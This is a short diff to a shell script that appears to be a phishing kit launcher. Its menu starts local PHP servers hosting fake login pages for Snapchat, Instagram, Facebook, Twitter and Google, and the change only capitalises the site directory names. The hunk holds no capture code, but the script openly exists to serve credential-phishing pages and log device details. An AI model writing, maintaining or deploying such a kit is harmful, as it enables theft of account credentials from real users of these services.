@@ -34,27 +34,27 @@ echo -e "Device Info: $(uname -a)\n" >> $log_file
 case $opt in
   1)
     echo -e "\e[1;32mStarting Snapchat phishing page..."
-    cd sites/snapchat
+    cd sites/Snapchat
     php -S 127.0.0.1:8080
     ;;
   2)
     echo -e "\e[1;32mStarting Instagram phishing page..."
-    cd sites/instagram
+    cd sites/Instagram
     php -S 127.0.0.1:8080
     ;;
   3)
     echo -e "\e[1;32mStarting Facebook phishing page..."
-    cd sites/facebook
+    cd sites/Facebook
     php -S 127.0.0.1:8080
     ;;
   4)
     echo -e "\e[1;32mStarting Twitter phishing page..."
-    cd sites/twitter
+    cd sites/Twitter
     php -S 127.0.0.1:8080
     ;;
   5)
     echo -e "\e[1;32mStarting Google phishing page..."
-    cd sites/google
+    cd sites/Google
     php -S 127.0.0.1:8080
     ;;
   6)
